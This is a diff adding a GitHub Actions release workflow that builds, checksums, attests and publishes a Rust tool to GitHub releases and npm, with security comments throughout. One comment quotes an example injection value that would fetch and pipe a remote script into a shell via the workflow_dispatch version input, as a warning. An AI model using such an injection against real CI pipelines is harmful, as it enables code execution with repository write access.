@@ -1,0 +1,264 @@
+name: Release
+
+on:
+  push:
+    tags: ["v*"]
+  workflow_dispatch:
+    inputs:
+      version:
+        description: Version to build, without the leading v
+        required: true
+
+permissions:
+  contents: write
+  id-token: write   # required to sign the build-provenance attestation
+  attestations: write
+
+env:
+  CARGO_TERM_COLOR: always
+
+jobs:
+  resolve:
+    name: Resolve version and matrix
+    runs-on: ubuntu-22.04
+    outputs:
+      version: ${{ steps.version.outputs.version }}
+      matrix: ${{ steps.matrix.outputs.matrix }}
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-node@v7
+        with:
+          node-version: 24
+      # SECURITY: `inputs.version` is attacker-controllable (anyone who can trigger workflow_dispatch
+      # chooses it) and this job holds `contents: write`. It must never be spliced into a `run:`
+      # script via `${{ }}` -- GitHub expands that *before* the shell sees it, so a value like
+      # `" ; curl evil.sh | sh #` would close the quote and execute. Passing it through `env:` makes
+      # it reach the shell as inert data (a variable value), never as script text. It is also
+      # strictly validated below before anything downstream trusts it: not just for injection, but
+      # because this version is later spliced into artifact filenames, a release tag, and a git ref.
+      - id: version
+        shell: bash
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_VERSION: ${{ inputs.version }}
+        run: |
+          set -euo pipefail
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            version="$INPUT_VERSION"
+          else
+            version="${GITHUB_REF_NAME#v}"
+          fi
+          if ! [[ "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$ ]]; then
+            # Deliberately not echoing the raw value into this annotation: it just failed
+            # validation, so it may be exactly the kind of malformed/hostile string this check
+            # exists to catch, and workflow-command annotations are themselves injectable via
+            # embedded newlines.
+            echo "::error::version input does not match the required <major>.<minor>.<patch>[-prerelease] format"
+            exit 1
+          fi
+          echo "version=$version" >> "$GITHUB_OUTPUT"
+      # The tag and Cargo.toml must agree. A release whose binary reports a different version than
+      # its tag is the kind of thing nobody notices until someone is debugging production.
+      - name: Verify Cargo.toml matches the tag
+        shell: bash
+        env:
+          RELEASE_VERSION: ${{ steps.version.outputs.version }}
+        run: |
+          set -euo pipefail
+          manifest=$(grep -m1 '^version = ' Cargo.toml | cut -d'"' -f2)
+          if [ "$manifest" != "$RELEASE_VERSION" ]; then
+            echo "::error::Cargo.toml is $manifest but the release is $RELEASE_VERSION"
+            exit 1
+          fi
+      # The platform matrix is derived from prebuilt-targets.json so the build, the npm packages,
+      # and the Action can never disagree about which platforms exist.
+      - id: matrix
+        run: |
+          node --input-type=module -e '
+            const { TARGETS } = await import("./npm/lib/targets.mjs");
+            const include = Object.entries(TARGETS).map(([key, t]) => ({
+              key, runner: t.runner, rustTarget: t.rustTarget, binaryName: t.binaryName,
+            }));
+            console.log(`matrix=${JSON.stringify({ include })}`);
+          ' >> "$GITHUB_OUTPUT"
+
+  build:
+    name: Build ${{ matrix.key }}
+    needs: resolve
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      fail-fast: false
+      matrix: ${{ fromJSON(needs.resolve.outputs.matrix) }}
+    steps:
+      - uses: actions/checkout@v7
+      - uses: dtolnay/rust-toolchain@stable
+        with:
+          targets: ${{ matrix.rustTarget }}
+      - uses: Swatinem/rust-cache@v2
+        with:
+          key: ${{ matrix.rustTarget }}
+      - name: Install musl tooling
+        if: contains(matrix.rustTarget, 'musl')
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y musl-tools
+      - shell: bash
+        env:
+          RUST_TARGET: ${{ matrix.rustTarget }}
+        run: cargo build --release --locked --target "$RUST_TARGET"
+      - name: Package
+        shell: bash
+        env:
+          VERSION: ${{ needs.resolve.outputs.version }}
+          TARGET_KEY: ${{ matrix.key }}
+          RUST_TARGET: ${{ matrix.rustTarget }}
+          BINARY_NAME: ${{ matrix.binaryName }}
+        run: |
+          set -euo pipefail
+          name="vitest-dedup-${VERSION}-${TARGET_KEY}"
+          mkdir -p "dist/$name"
+          cp "target/${RUST_TARGET}/release/${BINARY_NAME}" "dist/$name/"
+          cp README.md LICENSE "dist/$name/" 2>/dev/null || true
+          cd dist
+          tar -czf "$name.tar.gz" "$name"
+          # The Action verifies this digest before executing the binary, so it must be produced
+          # here, alongside the artifact, and never regenerated later from an untrusted copy.
+          if command -v sha256sum >/dev/null; then
+            sha256sum "$name.tar.gz" > "$name.tar.gz.sha256"
+          else
+            shasum -a 256 "$name.tar.gz" > "$name.tar.gz.sha256"
+          fi
+      - uses: actions/upload-artifact@v7
+        with:
+          name: release-${{ matrix.key }}
+          path: dist/*.tar.gz*
+          if-no-files-found: error
+      # The raw, unarchived binary, for the npm platform packages. It is uploaded separately rather
+      # than re-extracted from the archive so the npm job can prove, by digest, that the two are the
+      # same file -- see scripts/release/verify-npm-binaries.mjs. `compression-level: 0` because the
+      # artifact store would otherwise spend minutes recompressing an already-stripped executable.
+      - uses: actions/upload-artifact@v7
+        with:
+          name: binary-${{ matrix.rustTarget }}
+          path: target/${{ matrix.rustTarget }}/release/${{ matrix.binaryName }}
+          if-no-files-found: error
+          compression-level: 0
+
+  publish:
+    name: Publish release
+    needs: [resolve, build]
+    runs-on: ubuntu-22.04
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-node@v7
+        with:
+          node-version: 24
+      - uses: actions/download-artifact@v8
+        with:
+          pattern: release-*
+          path: artifacts
+      - name: Collect and verify
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p dist
+          find artifacts -type f -name '*.tar.gz*' -exec cp {} dist/ \;
+          cd dist
+          # Re-verify every digest before publishing. A corrupted upload that ships with a matching
+          # but wrong checksum would be verified successfully by every consumer.
+          for sum in *.sha256; do sha256sum -c "$sum"; done
+          cat *.sha256 > SHA256SUMS
+          expected=$(node --input-type=module -e '
+            const { TARGETS } = await import("../npm/lib/targets.mjs");
+            console.log(Object.keys(TARGETS).length);
+          ')
+          actual=$(ls -1 *.tar.gz | wc -l | tr -d ' ')
+          if [ "$expected" != "$actual" ]; then
+            echo "::error::expected $expected platform archives, found $actual"
+            exit 1
+          fi
+      # The checksums travel with the artifacts and therefore cannot vouch for their origin -- a
+      # pipeline that can publish a bad binary can publish a matching digest. This attestation is
+      # signed by GitHub's OIDC identity instead of by this workflow's own output, so it is the
+      # part a consumer can actually verify independently.
+      - uses: actions/attest-build-provenance@v4
+        with:
+          subject-path: dist/*.tar.gz
+
+      - uses: softprops/action-gh-release@v2
+        with:
+          tag_name: v${{ needs.resolve.outputs.version }}
+          name: v${{ needs.resolve.outputs.version }}
+          generate_release_notes: true
+          files: |
+            dist/*.tar.gz
+            dist/*.sha256
+            dist/SHA256SUMS
+
+  # ------------------------------------------------------------------------------------------
+  # npm distribution
+  # ------------------------------------------------------------------------------------------
+  #
+  # Runs only after the GitHub release exists, because the release is the recoverable step and npm
+  # is not: a published version cannot be replaced, and unpublishing is restricted after 72 hours.
+  # Gated on the `PUBLISH_NPM` repository variable so that tagging a release does not fail on npm
+  # until trusted publishing is configured for these package names on npmjs.com; set it to `true`
+  # once it is.
+  #
+  # Authentication is npm trusted publishing: the job's OIDC identity (`id-token: write`) is
+  # exchanged by npm >= 11.5.1 for a short-lived registry credential. There is deliberately no
+  # NPM_TOKEN anywhere in this file -- a long-lived token in repository secrets is the credential
+  # this design exists to avoid.
+  publish-npm:
+    name: Publish npm packages
+    needs: [resolve, build, publish]
+    if: vars.PUBLISH_NPM == 'true'
+    runs-on: ubuntu-22.04
+    timeout-minutes: 20
+    environment: npm
+    permissions:
+      contents: read
+      id-token: write
+    env:
+      VERSION: ${{ needs.resolve.outputs.version }}
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-node@v7
+        with:
+          node-version: 24
+          registry-url: https://registry.npmjs.org
+      # Kept unmerged: every target's binary is called `vitest-dedup`, so merging would collapse
+      # eight different executables onto one path.
+      - uses: actions/download-artifact@v8
+        with:
+          pattern: binary-*
+          path: native
+      - uses: actions/download-artifact@v8
+        with:
+          pattern: release-*
+          path: release-assets
+          merge-multiple: true
+      - name: Verify every version site agrees with the tag
+        shell: bash
+        env:
+          EXPECTED_VERSION: ${{ needs.resolve.outputs.version }}
+          RELEASE_TAG: v${{ needs.resolve.outputs.version }}
+        run: node scripts/release/check-release-version.mjs
+      # Ties the npm binaries to the attested release archives by digest. Without this, "the
+      # release is attested" would say nothing about what npm users receive.
+      - name: Verify npm binaries against the checksummed release archives
+        shell: bash
+        run: |
+          set -euo pipefail
+          node scripts/release/verify-npm-binaries.mjs \
+            --binaries native --archives release-assets --version "$VERSION"
+      - name: Generate the platform packages
+        run: node scripts/release/prepare-npm-packages.mjs native
+      - name: Re-verify the generated packages
+        run: node scripts/release/check-release-version.mjs
+      - name: Confirm npm supports trusted publishing
+        run: node scripts/release/check-npm-trusted-publishing.mjs
+      # Platform packages first, launcher last, each skipped if already at this version -- so a
+      # rerun after a partial failure completes the set instead of conflicting on it.
+      - name: Publish platform packages, then the launcher
+        run: node scripts/release/publish-npm-packages.mjs
